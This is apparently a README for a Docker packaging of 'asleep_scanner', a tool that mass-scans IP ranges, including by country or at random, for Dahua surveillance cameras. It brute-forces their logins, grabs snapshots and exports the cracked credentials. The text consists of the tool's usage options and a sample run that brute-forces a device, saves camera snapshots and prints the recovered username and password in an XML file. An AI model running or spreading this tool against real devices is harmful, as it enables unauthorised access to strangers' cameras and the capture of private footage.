# docker-asleep_scanner

dockerised asleep_scanner for Dahua equipment.

Refer to: [https://github.com/S0Ulle33/asleep_scanner](https://github.com/S0Ulle33/asleep_scanner)

Examples:

```
user@box docker-asleep_scanner % docker run asleep_scanner:latest
              __              
  ____ ______/ /__  ___  ____ 
 / __ `/ ___/ / _ \/ _ \/ __ \
/ /_/ (__  ) /  __/  __/ /_/ /
\__,_/____/_/\___/\___/ .___/ 
                     /_/      

https://t.me/asleep_cg

usage: asleep.py [-h] [-s SCAN_FILE] [-p PORTS] [-b BRUTE_FILE] [-l] [-m]
                 [-t THREADS] [--masscan-resume] [--no-snapshots] [--no-xml]
                 [--dead] [--country] [--random-country] [-d]

options:
  -h, --help        show this help message and exit
  -s SCAN_FILE      file with IP ranges to scan, e.g. 192.168.1.1-192.168.11.1
  -p PORTS          ports to scan (default: 37777), e.g. 37777,37778
  -b BRUTE_FILE     file with IPs to brute, in any format
  -l                brute combinations from logins.txt and passwords.txt
                    instead of combinations.txt
  -m, --masscan     run Masscan and brute the results
  -t THREADS        number of thread for Masscan (default: 3000)
  --masscan-resume  continue paused Masscan
  --no-snapshots    don't make snapshots
  --no-xml          don't make SMART PSS .xml files
  --dead            write not bruted cams to dead_cams.txt file
  --country         scan by country
  --random-country  scan by random country
  -d, --debug       debug output
user@box docker-asleep_scanner %

user@box docker-asleep_scanner % docker compose up
[+] Running 1/0
 ✔ Container asleep_scanner-asleep-scanner-1  Recreated                                                                                                                                                                                                           0.0s 
Attaching to asleep-scanner-1
asleep-scanner-1  |               __              
asleep-scanner-1  |   ____ ______/ /__  ___  ____ 
asleep-scanner-1  |  / __ `/ ___/ / _ \/ _ \/ __ \
asleep-scanner-1  | / /_/ (__  ) /  __/  __/ /_/ /
asleep-scanner-1  | \__,_/____/_/\___/\___/ .___/ 
asleep-scanner-1  |                      /_/      
asleep-scanner-1  | 
asleep-scanner-1  | https://t.me/asleep_cg
asleep-scanner-1  | 
asleep-scanner-1  | [2024-07-16 06:06:08,491] [INFO] Parsed 10 IPs from Masscan output
asleep-scanner-1  | [2024-07-16 06:06:08,493] [INFO] IPs saved to reports/ips_2024.07.16-06.06.08.txt
asleep-scanner-1  | [2024-07-16 06:06:08,496] [INFO] Starting to brute total 10 devices
asleep-scanner-1  | 
asleep-scanner-1  | Brute progress: [31.0] Grabbing snapshots for 203.0.113.0.. 
Brute progress: [37.0] Grabbing snapshots for 203.0.113.0.. 
Brute progress: [41.0] Grabbing snapshots for 203.0.113.0.. 
Brute progress: [45.0] Grabbing snapshots for 203.0.113.0.. 
asleep-scanner-1  | Writing snapshots.. Total saved 3 from 4
asleep-scanner-1  | 
asleep-scanner-1  | [2024-07-16 06:06:18,045] [INFO] Results: 10 devices found, 1 bruted
asleep-scanner-1  | [2024-07-16 06:06:18,045] [INFO] Made total 4 snapshots
asleep-scanner-1  | [2024-07-16 06:06:18,051] [INFO] Saved SMART PSS XML to reports/save.xml
asleep-scanner-1 exited with code 0
user@box docker-asleep_scanner %
user@box docker-asleep_scanner % cat reports/save.xml 
<Organization><Department name="root"><Device title="203.0.113.0_666666:666666" ip="203.0.113.0" port="37777" user="666666" password="666666" /></Department></Organization>%                                                                                    
user@box docker-asleep_scanner % 
```
